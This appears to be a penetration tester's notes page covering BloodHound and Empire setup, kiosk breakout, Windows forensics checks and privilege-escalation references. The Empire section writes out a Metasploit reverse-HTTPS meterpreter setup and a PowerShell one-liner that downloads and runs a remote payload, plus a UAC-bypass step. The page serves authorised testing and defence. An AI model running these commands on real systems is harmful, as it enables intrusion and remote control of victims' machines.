# Network pentesting

Quick references
--------
* [Common TCP/UDP ports reference](commonports.jpg)


Bloodhound
--------
[Bloodhound](https://github.com/adaptivethreat/BloodHound), according to GitHub "uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Defenders can use BloodHound to identify and eliminate those same attack paths. Both blue and red teams can use BloodHound to easily gain a deeper understanding of privilege relationships in an Active Directory environment.

### Quick start guide using Kali

#### Clone Bloodhound repository     
    git clone https://github.com/adaptivethreat/BloodHound /opt/bloodhound

#### Install Neo4j

Go to [https://neo4j.com/](https://neo4j.com/) and download/extract the Linux package.

#### Download and extract the Bloodhound binaries
Grab the one that's right for your environment [here](https://github.com/adaptivethreat/BloodHound/releases).

#### Copy the Bloodhound database over the sample neo4j one

    cp -r /path-to-bloodhound/BloodHoundExampleDB.graphdb /path-to-neo4j/data/databases/sample.

#### Login to Neo4j portal and change the password

From the `/path-to-neo4j/` run this:

    neo4j console  

You'll be given a Web URL to visit.  Upon opening it you'll be prompted to change the password from `neo4j` to something else.  Do it.  :-)

#### Run Bloodhound

Now, go to the `/path-you-extracted-bloodhound-binaries-to/` and run `./Bloodhound`

Once the Bloodhound [interface](https://github.com/adaptivethreat/Bloodhound/wiki/Interface-Intro) is open, you'll provide a URL of `http://localhost:7474`, a DB Username of `neo4j` and a password of `yournewpassword`

#### Collect data to slurp into Bloodhound
There are many ways to do this, but what I did is uploaded [BloodHound.ps1](https://github.com/adaptivethreat/BloodHound/tree/master/PowerShell) to a temp folder on my target, then ran these PS commands:

    import-module BloodHound.ps1
    Get-BloodHoundData | Export-BloodHoundCSV

This dumped a handful of .csv files to the folder that `BloodHound.ps1` was in.  I downloaded those via my Empire agent using `download blah.csv` `download blah2.csv` etc. and then those files get stored in `path/to/empire/downloads/NAME-OF-AGENT`

#### Import data into Neo4j
I must've done something wrong in the above steps because from all the examples and YouTube videos I've seen, there is sample data you can map and play with.  That wasn't the case for me - my data set was blank.  Regardless, all I cared about was importing my newly acquired data :-)

Near the upper right of the Neo4j console you will see an `Import Data` button.  Click it, then point to one of your .csv files to upload it.  Continue until all are uploaded, and now you're ready to analyze the data!


Breakout techniques
------
Here are some resources that are handy to have when you need to try to "break out" of restricted environments such as Citrix portals, RDP sessions, kiosks, etc.

A few excellent articles to bookmark, like *now*:

* [Breaking Out of Citrix and other Restricted Desktop Environments](https://www.pentestpartners.com/blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/) covers all sorts of attack vectors, from abusing dialog boxes to exploiting weak credentials.

* [Breaking Out! of Applications Deployed via Terminal Services, Citrix, and Kiosks](https://blog.netspi.com/breaking-out-of-applications-deployed-via-terminal-services-citrix-and-kiosks/) is also a great post on finding ways to break out of limitations set on your Citrix/kiosk session.

### A short "can I run this?" checklist
If you can pop any of these executables, you may be able to use them for further exploration and exploitation:

* Cmd.exe (also try via batch file with `cmd /k pause`)
* Command.com
* Cscript
* Ftp
* InstallUtil
* Mspaint
* Powershell.exe (often at `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`)
* Powershell_ise.exe (often at `C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe`)
* Regsvr32
* Rundll32
* Taskmgr
* Taskschd
* Telnet
* Wscript

### Can't run an .exe?  How about rename it?
I just had a pentest where I copied `powershell.exe` to the desktop, named it `p.exe` and it ran like a champ.

### Sticky Keys Slayer
[This tool](https://github.com/linuz/Sticky-Keys-Slayer) connects to an RDP host (or a list of them) to see if the accessibility features can be accessed.  


Empire
-------
[Empire](https://github.com/adaptivethreat/Empire) is a "pure PowerShell post-exploitation agent built on cryptologically-secure communications and a flexible architecture."

Some links that helped me create my write-up below:

* [https://attackerkb.com/Powershell/Powershell_Empire](https://attackerkb.com/Powershell/Powershell_Empire)
* [https://enigma0x3.net/2016/03/15/phishing-with-empire/](https://enigma0x3.net/2016/03/15/phishing-with-empire/)
* [CheatSheets for various modules](https://github.com/HarmJ0y/CheatSheets)

### Install

The [getting started guide](http://www.powershellempire.com/?page_id=110) walks you through a basic install - here's the quick steps:

    git clone https://github.com/adaptivethreat/Empire.git /opt/empire
    cd /opt/empire/setup
    ./install.sh
    /opt/empire/empire.sh

I found afterwards that my fresh Ubuntu droplet from Digital Ocean coughed up this error when I ran `./empire`:

>Traceback (most recent call last):

>File "./empire", line 6, in <module>

>from OpenSSL import SSL

>ImportError: No module named OpenSSL

Once I did a `sudo apt-get install python-openssl` then everything ran like a champ.

### Run empire
Run `/opt/empire/empire`

### Launch a listener
1. Type `uselistener http` and hit **Enter**
2. Set host with `set Host 192.168.3.101`
3. Set port with `set Port YOUR-PORT-HERE`
4. Type `info` and hit Enter to confirm the listener is good to go.
5. Type `execute` to run it (if you need to kill it, use `listeners` to see the list of listeners, then do `kill http` or whatever the name is.

P.S. - [BHIS](http://bhis.co) has a nice tutorial for [scripting the startup of Empire listeners](http://www.blackhillsinfosec.com/?p=5428).

### Configure a stager
1. Type `usestager` and then hit **Tab** to see your options.  Select one that's right for your environment.

2. Assign the stager to a configured listener by typing `set Listener NAME-OF_LISTENER`

3. Type `generate` to actually generate it.

### Manage connected machines
Once you get a "bite" type `agents` to see connected machines.  Then do `interact NAME-OF-MACHINE` to begin interacting with it.

### Establish credential sets
I followed [this page](http://www.powershellempire.com/?page_id=114) to figure out how to add/edit credential sets into Empire so they're easily "pluggable" into Empire modules without having to type them every time.

### Create a secondary meterpreter listener
Follow [this article](http://www.powershellempire.com/?page_id=137) for more info, but basically in the `listeners` do a `set Host http://whatever.the.host.is` and `set Type meter`.  Then type `execute` and `list` to see your new listener.

Now on your Kali/Metasploit box, run the following commands to "catch" your incoming shell:

	use exploit/multi/script/web_delivery
	unset all
	set srvhost 0.0.0.0
	set srvport 80
	set lhost MY.PUBLIC.IP.ADDRESS
	set lport 443
	set target 2
	set payload windows/x64/meterpreter/reverse_https
	exploit -j

This will give you a PowerShell one-liner with something like:

`powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $c.downloadstring('http://your-public-ip-address/V23fasdfg4rP5XBryb');
`
Launch the one-liner and you should be in happy shell land!

### Elevating privs
Once you've figured out a way to make your limited account a local admin, here's how you can make your victim machine connect to you *again* but this time with more privs!

1. While interacting with your agent, issue the command `bypassuac NAME-OF-LISTENER`.  So for example, my listener with my initial shell was called `test` so I issued `bypassuac test`
2. You should see a "new" agent connect to your listener, but this one has a *`* by it, indicating it is running w/elevated privs!!!

### Other resources:
* [Intercepting passwords with Empire and winning!](https://sensepost.com/blog/2016/intercepting-passwords-with-empire-and-winning/)

Forensics
--------
### Getting started / quick refs
A few links to check out:

* [System Resource Utilization Monitor](https://isc.sans.edu/forums/diary/System+Resource+Utilization+Monitor/21927/)

* [SANS Windows intrusion detection cheat sheet](https://pen-testing.sans.org/retrieve/windows-cheat-sheet.pdf)

* [Google Rapid Response Framework](https://github.com/google/grr-doc/blob/master/quickstart.adoc)

### Linux
* [Apache: Extending and Analyzing the Access Log](https://www.netnea.com/cms/apache-tutorial-5_extending-access-log/)

### Windows
*The info below is based on the BHIS Webcast you should definitely check out [here](https://www.youtube.com/watch?v=HcUMXxyYsnw&app=desktop)*!

#### What network communication is happening?

Look at file shares: `net view \\127.0.0.1`

Who has an open session with this machine? `net session`

Which sessions does this machine have open with other systems? `net use`

What's the NetBIOS and TCP/IP activity look like? `nbtstat -S`

`netstat -naob` - the *o* give process IDs, the *b* gives us EXEs that are running

Look for weird listening TCP/UDP ports:

`netstat -na`

To run this in "continuously update" mode:

`netstat -na 5` or add the *o* flag to show ownership of process id: `netstat -nao 5`

Is the firewall running?

* XP/2003: `netsh firewall show config`

* 7/10: `netsh advfirewall show currentprofile`


`tasklist /m /fi "pid eq NUMBER-OF-PID"` will show DLLs loaded into the given executable

`wmnic process where processid=NUMBER-OF-PID get commandline` will show the actual executable that's running the given process

### Checking a system for possible communication with known bad IPs

Run `netstat -naob > netstat.txt` then run the file against the [DNS blacklists tool from BHIS](https://bitbucket.org/ethanr/dns-blacklists) with:

`./dns_blacklists.py ./bad_lists/ ./check`

(The *netstat.txt* should be in the `/check` directory)

### Analyzing running services

`services.msc` - the basic services control panel

`net start` - shows services that are currently started

`sc query | more` - services in finer detail

`tasklist /svc` - helps map out which services are running out of which parent process

### Check registry for signs of persistence:

`HKLM\Software\Windows\CurrentVersion\Run`
`HKLM\Software\Windows\CurrentVersion\Runonce`
`HKLM\Software\Windows\CurrentVersion\RunonceEx`

(Explore these both in *HKLM* and *HKCU*)

[Autoruns](https://technet.microsoft.com/en-us/sysinternals/bb963902.aspx) will help you find startup items as well.

### Check for strange users and groups

`lusermgr.msc` - click groups, double-click Administrators

`net user` - list of available users

`net localgroup administrators` - lists out the admin groups

### Find unusual files

Look for files larger than 10 meg:

`FOR /R C:\ %i in (*) do @if %~zi gtr 10000000 echo %i %~zi`

In the GUI:

* XP/2003: *Start->Search->For Files and Folders-->Search Options-->Size-->At Least 10000KB*

* Win 7/10: Explorer search box, then type "size:>10M"

### Finding scheduled tasks

`schtasks`

Look for unusual tasks, especially those running as Admin/SYSTEM (or blank username)

The "at" command shows tasks that were scheduled using the *at* command

### Event log analysis
Download [check-critical-events.ps1](https://www.dropbox.com/sh/gb6k64cm3m641td/AADWA4TvjHcJXw5YUVT8g-PVa/check-critical-events.ps1?dl=0)

Note: with the [Shadowbrokers fiasco](https://en.wikipedia.org/wiki/The_Shadow_Brokers), we need to be aware that there *may* be a tool out there that can selectivelly delete nuke Windows logs on the fly without a reboot or system instability (!).

#### Security Windows event IDs to look for:

* Security 4720 - User account created
* Security 4722 - user account enabled
* Security 4724 - password reset
* Security 4738 - user account change
* Security 4732 - account added or removed from a group
* Security 1102 - Audit log cleared

#### System Windows event IDs:

* System 7030 - basic service ops
* System 7045 - service installed
* System 1056 - DHCP oddities
* System 10000 - Com Functionality (see SubTee's sites)
* System 20001 - device driver installation
* System 20002 - remote access
* System 20003 - service install

### *Do* try this at home!
Head to [http://tinyurl.com/504-extra](http://tinyurl.com/504-extra) and download the [504lab-32.exe](https://www.dropbox.com/sh/gb6k64cm3m641td/AACAAzyzjYoySuR64xslLLF8a/504lab-32bit.exe?dl=0) to practice your skills in detecting backdoors!

Privilege Escalation
---------
Some good blogs, cheat sheets, etc. for privesc.

### Linux

#### Quick refs / cheat sheets
* g0tmi1k's [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) post should be in your bookmarks, like, right now.

* 1N3's [privesc project](https://github.com/1N3/PrivEsc) has "A collection of Windows, Linux and MySQL privilege escalation scripts and exploits."  Also check out [Kernel Exploits](https://www.kernel-exploits.com) for pre-compiled local Linux Exploits.

* [4 ways to get Linux privesc](http://www.hackingarticles.in/4-ways-get-linux-privilege-escalation/) focuses on using some popular tools to elevate privs from a limited shell.

* [Escaping a restricted shell](https://humblesec.wordpress.com/2016/12/08/escaping-a-restricted-shell/)

* [LinEnum](https://github.com/rebootuser/LinEnum) contains "scripted local Linux enumeration and privilege escalation checks."

* THIS: https://github.com/ngalongc/AutoLocalPrivilegeEscalation

What about: http://pentestmonkey.net/tools/audit/unix-privesc-check

What about: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=3&cad=rja&uact=8&ved=0ahUKEwiK3p7W2czRAhWI8YMKHd-rBRsQFggnMAI&url=https%3A%2F%2Fwww.securitysift.com%2Fdownload%2Flinuxprivchecker.py&usg=AFQjCNEp0BPIXAOp4BOJwwkT5pBtVTTp9A

https://www.securitysift.com/download/linuxprivchecker.py


### Windows
#### Quick wins
Here are several checks to do on a local system which may aid in privesc:

#### Missing patches
Here are a few KBs to keep an eye out for.  If they're missing from the target you're pentesting, then privesc may be possible!

* https://support.microsoft.com/en-us/kb/3165191 (MS16-077) may allow potato/tater attack
* Many others - see [PowerShellEmpireModule_MissingPatches](https://github.com/hackern0v1c3/PowershellEmpireModule_MissingPatches)

#### Check for LLMNR
See if EnableMulticast variable is present and not set to 0:

##### Server 2008
    get-itemproperty -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient"

##### Server 2012

    get-itemproperty -path "HKLM:\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters"

#### Check for NBT-NS
Find instances where Netbios name resolution is enabled (TRUE)

    wmic nicconfig where TcpipNetbiosOptions=0

P.S. - the fix is:

    wmic nicconfig where (TcpipNetBiosOptions!=Null and TcpipNetbiosOptions!=2) call SetTcpipNetbios 2

#### Check for WPAD

Check *Internet Explorer > Internet Options > Connections Tab > LAN Settings > Auto Detect Enabled*

#### See if plaintext credentials stored
Check if wdigest is in use:

    get-itemproperty -path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages"

Note: if `Security Packages` has a null value it won't auto-complete, so you can run the command at `\Lsa` to double-check.

#### See if plaintext storage is enabled (`UseLogonCredential` not equal to 0):

    (UseLogonCredential != 0):
    get-itemproperty -path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"

#### Check for DLL pre-loading
See if `CWDIllegalInDllSearch` exists and is not set to `0`:

    get-itemproperty -path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"

#### Check for SMB Signing
Check server (`requiresecuritysignature` is not equal to `1`)    

    get-itemproperty -path "HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters"

Check the client (`requiresecuritysignature` not set to `1`)

    get-itemproperty -path "HKLM:\SYSTEM\CurrentControlSet\Services\LanManWorkstation\Parameters"

#### Check for LM/NTLM hashing
Check if `lmcompatibilitylevel` does not equal `4,5:`

    get-itemproperty -path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"   

#### Check for Kerberos DES Hashing
Lookup supportedencryptiontypes (hex values differ):

    get-itemproperty -path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\Parameters"

Note `supportedencryptiontypes` does not exist (path is invalid in Server 2012)

#### Hot Potato attack
This [attack](https://foxglovesecurity.com/2016/01/16/hot-potato/) "takes advantage of known issues in Windows to gain local privilege escalation in default configurations, namely NTLM relay (specifically HTTP->SMB relay) and NBNS spoofing" and can (potentially) work on Windows 7,8,10, Server 2008, and Server 2012.

#### Rotten Potato attack
Read more [here](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/), but per the site, the idea is:

1. Trick the “NT AUTHORITY\SYSTEM” account into authenticating via NTLM to a TCP endpoint we control.

2. Man-in-the-middle this authentication attempt (NTLM relay) to locally negotiate a security token for the “NT AUTHORITY\SYSTEM” account. This is done through a series of Windows API calls.

3. Impersonate the token we have just negotiated. This can only be done if the attackers current account has the privilege to impersonate security tokens. This is usually true of most service accounts and not true of most user-level accounts.

#### Just Enough Administration (JEA)
Here's a [great discussion](https://www.scriptjunkie.us/2016/10/just-too-much-administration-breaking-jea-powershells-new-security-barrier/) on using/abusing JEA, which is "a new Windows 10/Server 2016 feature to create granular least privilege policies by granting specific administrative privileges to users."  However, according to the article's author, "... every JEA role capability example I found Microsoft had published had vulnerabilities that could be exploited to obtain complete system administrative rights, most of them immediately, reliably, and without requiring any special configuration."

#### Password brute-forcing / dumping
[Mimikittenz](https://github.com/putterpanda/mimikittenz)

[Better default passwordlist](https://github.com/govolution/betterdefaultpasslist)

[IPMI default pw list](https://github.com/netbiosX/Default-Credentials/blob/master/IPMI-Default-Password-List.mdown
)

#### Tutorials
* A tutorial from [Fuzzy Security](http://www.fuzzysecurity.com/tutorials/16.html)
* Pentest Monkey's [windows-privesc-check](http://pentestmonkey.net/tools/windows-privesc-check) script

Tunneling
---------
Just getting this section started, but found a cool tool for icmp tunneling called (appropriately), [icmptunnel](https://github.com/DhavalKapil/icmptunnel)
